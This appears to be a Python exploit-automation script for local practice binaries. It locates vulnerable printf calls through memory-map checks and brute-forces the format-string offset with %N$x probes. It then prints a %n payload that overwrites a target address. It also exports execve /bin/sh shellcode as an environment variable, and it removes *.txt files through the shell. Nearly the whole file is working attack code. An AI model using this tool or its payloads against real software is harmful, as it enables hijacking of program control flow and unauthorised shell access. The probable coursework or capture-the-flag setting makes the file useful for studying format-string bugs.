import os
from subprocess import Popen,PIPE,call

########################

def removeTempFiles():
	return Popen(["rm *.txt"],stdout=PIPE,close_fds=True,shell=True).communicate()[0].strip()

########################

def executeProgram(binaryName, formatString):
	return Popen([binaryName, formatString],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

def parseAddressSpace(binaryName):
	return Popen(["gdb", "-q", binaryName],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

def prepareSharedLibrary():
	return Popen(["make","-C","."],stdout=PIPE,close_fds=True).communicate()[0].strip()

########################

# Compares address.txt and procMap.txt contents 
# Checks if any address is in memory with w bit set.
def findVulnPrintf():
	with open('procMap.txt') as f:
		zones = []
		contents = f.read();
		for line in contents.split('\n'):
			if not line:
				continue
			memrange, perms, _ = line.split(None, 2)
			start, end = memrange.split('-')
			zones.append({
				'start': int(start, 16),
				'end': int(end, 16),
				'perms': perms
			})

	with open('address.txt') as f:
		address = f.read().splitlines()				


	for index in range(len(address)):
		for mapping in zones:
			if mapping["start"] <= int(address[index],16) < mapping["end"]:
				break

		# Check the memory permissions
		if "w" in mapping["perms"]:
			print("Format function no. %d has format string in writable memory." % (index+1));

########################

def calculateOffset(binaryName, formatString):
	output = "";
	arg = 1;	
	
	while(1):

		if(arg>50):
			return -1;		

		format =  formatString + "%" + str(arg) + "$x";		
		output = executeProgram(binaryName,format);

		if( formatString+"41414141" in output):
			print("Offset between format string and its address is: %d words" % arg);
			print("Format string used: %s" % format);
			return arg;

		arg = arg + 1;

########################

def prepareFormatString(dummyString, addressToWrite, addressToOverwrite, distanceInWords):

	splitsAddressToOverwrite = [addressToOverwrite[x:x+2] for x in range(0,len(addressToOverwrite),2)]
	splitsAddressToWrite = [addressToWrite[x:x+2] for x in range(0,len(addressToWrite),2)]

	byte = [None]*4;

	for index in range(0, 4): 
		byte[index] = format(int(splitsAddressToOverwrite[3], 16) + index ,'x');
		byte[index] = byte[index] if (len(byte[index]) == 2) else "0"+byte[index];

	addressString = dummyString;
	for index in range(0, 4):
		addressString = (addressString + "\\x"+byte[index]+"\\x"+splitsAddressToOverwrite[2]+"\\x"+splitsAddressToOverwrite[1]+"\\x"+splitsAddressToOverwrite[0]);

	initialNum = len(dummyString)+16;
	offset = [None]*4;

	offset[0] = int(splitsAddressToWrite[3],16) - initialNum;
	if offset[0] < 8:
		 offset[0] = int(splitsAddressToWrite[3],16) + 256 - initialNum;

	j = 1;
	for index in xrange(3, 0, -1): 
		offset[j] = int(splitsAddressToWrite[index-1],16) - int(splitsAddressToWrite[index],16);
		if offset[j] < 8:
			 offset[j] = int(splitsAddressToWrite[index-1],16) + 256 - int(splitsAddressToWrite[index],16);
		j = j + 1;

	distanceInWords = distanceInWords + len(dummyString)/4;
	exploitString = "";

	for index in range(0, 4):
		exploitString = (exploitString + "%" + str(distanceInWords) + "\$" + str(offset[index]) + "x%" + str(distanceInWords+index) + "\$n");

	finalExploitString = addressString + exploitString;
	print (finalExploitString);

########################

def exportShellCode():

	os.environ["SHELLCODE"] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh";



# Write function which exports custom/default shell code and returns its address
# Write function which shows the addresses of GOT entries which can be overwritten


########################

def main():

	#binaryName = os.environ["PWD"] + "/binaries/newproblem1";	
	binaryName = os.environ["PWD"] + "/binaries/problem2";	
	#binaryName = os.environ["PWD"] + "/binaries/format";	
	exportShellCode();

'''
	#Remove Temporary files
	removeTempFiles();

	# Find vulnerable printf
	parseAddressSpace(binaryName);	
	
	prepareSharedLibrary();
	os.environ["LD_PRELOAD"] = os.environ["PWD"] + "/customFormatFunctions.so";
	output = executeProgram(binaryName, "test");
	del os.environ["LD_PRELOAD"];

	findVulnPrintf();
	
	# Find Offset 
	r = calculateOffset(binaryName, "AAAA");	
	dummyString = "AAAA";
	if(r == -1):
		r = calculateOffset(binaryName, "AAAAA");
		dummyString = "AAAAA";
		if(r == -1):
			print("Cannot find offset");
			dummyString = "";
	
	# Prepare dummy String
	if r != -1 :
		prepareFormatString(dummyString,"0804856d","0804a00c",r);	
'''


if __name__ == '__main__':
	main()
